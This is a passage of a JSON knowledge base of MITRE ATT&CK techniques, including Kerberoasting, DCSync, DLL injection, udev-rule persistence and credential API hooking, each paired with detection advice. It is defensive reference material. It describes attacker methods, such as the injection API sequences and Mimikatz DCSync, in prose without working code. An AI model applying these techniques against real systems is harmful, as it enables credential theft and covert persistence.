      "description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.004",
      "stix_id": "attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5",
      "created": "2020-03-13T20:33:00.009000+00:00",
      "modified": "2025-04-15T19:59:20.821000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Modification",
        "Process: Process Creation",
        "File: File Metadata",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)\n\nThere are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.\n\nThe Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)"
    },
    "T1558.003": {
      "id": "T1558.003",
      "name": "Kerberoasting",
      "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1558.003",
      "stix_id": "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee",
      "created": "2020-02-11T18:43:38.588000+00:00",
      "modified": "2025-04-15T19:59:20.912000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Credential Request"
      ],
      "defense_bypassed": [],
      "detection": "Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)"
    },
    "T1003.006": {
      "id": "T1003.006",
      "name": "DCSync",
      "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003.006",
      "stix_id": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163",
      "created": "2020-02-11T18:45:34.293000+00:00",
      "modified": "2025-04-15T22:13:04.812000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Access",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\n\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)"
    },
    "T1124": {
      "id": "T1124",
      "name": "System Time Discovery",
      "description": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can be used for the same purpose.\n\nIn addition, system calls \u2013 such as <code>time()</code> \u2013 have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1124",
      "stix_id": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
      "created": "2017-05-31T21:31:37.450000+00:00",
      "modified": "2025-04-15T19:59:21.176000+00:00",
      "platforms": [
        "Windows",
        "Network Devices",
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.\n\nFor network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations."
    },
    "T1053.002": {
      "id": "T1053.002",
      "name": "At",
      "description": "Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)\n\nOn Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)\n\nAdversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1053.002",
      "stix_id": "attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0",
      "created": "2019-11-27T13:52:45.853000+00:00",
      "modified": "2025-04-15T19:59:21.266000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Scheduled Job: Scheduled Job Creation",
        "Network Traffic: Network Traffic Flow",
        "Process: Process Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.\n\nIn Linux and macOS environments, monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nReview all jobs using the <code>atq</code> command and ensure IP addresses stored in the <code>SSH_CONNECTION</code> and <code>SSH_CLIENT</code> variables, machines that created the jobs, are trusted hosts. All [at](https://attack.mitre.org/software/S0110) jobs are stored in <code>/var/spool/cron/atjobs/</code>.(Citation: rowland linux at 2019)\n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [Command and Control](https://attack.mitre.org/tactics/TA0011), learning details about the environment through [Discovery](https://attack.mitre.org/tactics/TA0007), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008)."
    },
    "T1055.001": {
      "id": "T1055.001",
      "name": "Dynamic-link Library Injection",
      "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.001",
      "stix_id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
      "created": "2020-01-14T01:26:08.145000+00:00",
      "modified": "2025-04-16T20:37:22.834000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Metadata",
        "Process: Process Access",
        "Process: Process Modification",
        "Module: Module Load",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1588.005": {
      "id": "T1588.005",
      "name": "Exploits",
      "description": "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1588.005",
      "stix_id": "attack-pattern--f4b843c1-7e92-4701-8fed-ce82f8be2636",
      "created": "2020-10-01T02:17:46.086000+00:00",
      "modified": "2025-04-15T22:34:05.500000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004))."
    },
    "T1556": {
      "id": "T1556",
      "name": "Modify Authentication Process",
      "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556",
      "stix_id": "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84",
      "created": "2020-02-11T19:01:56.887000+00:00",
      "modified": "2025-04-15T19:59:21.746000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Network Devices",
        "IaaS",
        "SaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Process: Process Access",
        "Logon Session: Logon Session Creation",
        "Active Directory: Active Directory Object Modification",
        "User Account: User Account Authentication",
        "Process: OS API Execution",
        "Windows Registry: Windows Registry Key Creation",
        "File: File Creation",
        "User Account: User Account Modification",
        "File: File Modification",
        "Module: Module Load",
        "Cloud Service: Cloud Service Modification",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\n\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) \n\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.(Citation: Xorrior Authorization Plugins)\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nMonitor property changes in Group Policy that manage authentication mechanisms (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). The <code>Store passwords using reversible encryption</code> configuration should be set to Disabled. Additionally, monitor and/or block suspicious command/script execution of <code>-AllowReversiblePasswordEncryption $true</code>, <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>. Finally, monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)\n"
    },
    "T1546.017": {
      "id": "T1546.017",
      "name": "Udev Rules",
      "description": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the `/dev` directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with `match keys` to specify the conditions a hardware event must meet and `action keys` to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, and `/lib/udev/rules.d/`. Rule priority is determined by both directory and by the digit prefix in the rule filename.(Citation: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)\n\nAdversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as `/dev/random`, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key `RUN+=` to detach and run the malicious content\u2019s process in the background to bypass these controls.(Citation: Reichert aon sedexp 2024)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.017",
      "stix_id": "attack-pattern--f4c3f644-ab33-433d-8648-75cc03a95792",
      "created": "2024-09-26T17:02:09.888000+00:00",
      "modified": "2025-04-15T23:17:25.978000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file creation and modification of Udev rule files in `/etc/udev/rules.d/`, `/lib/udev/rules.d/`, and /usr/lib/udev/rules.d/, specifically the `RUN` action key commands.(Citation: Ignacio Udev research 2024) "
    },
    "T1056.004": {
      "id": "T1056.004",
      "name": "Credential API Hooking",
      "description": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user credentials. \n\nIn Windows, hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nIn Linux and macOS, adversaries may hook into system functions via the `LD_PRELOAD` (Linux) or `DYLD_INSERT_LIBRARIES` (macOS) environment variables, which enables loading shared libraries into a program\u2019s address space. For example, an adversary may capture credentials by hooking into the `libc read` function leveraged by SSH or SCP.(Citation: Intezer Symbiote 2022)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1056.004",
      "stix_id": "attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6",
      "created": "2020-02-11T19:01:15.930000+00:00",
      "modified": "2025-04-15T19:59:21.920000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Metadata",
        "Module: Module Load",
        "File: File Creation",
        "File: File Modification",
        "Command: Command Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)\n\nRootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.\n\nVerify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)"
    },
    "T1495": {
      "id": "T1495",
      "name": "Firmware Corruption",
      "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\n\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). ",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1495",
      "stix_id": "attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89",
      "created": "2019-04-12T18:28:15.451000+00:00",
      "modified": "2025-04-16T20:37:22.991000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Firmware: Firmware Modification"
      ],
      "defense_bypassed": [],
      "detection": "System firmware manipulation may be detected.(Citation: MITRE Trustworthy Firmware Measurement) Log attempts to read/write to BIOS and compare against known patching behavior."
    },
    "T1490": {
      "id": "T1490",
      "name": "Inhibit System Recovery",
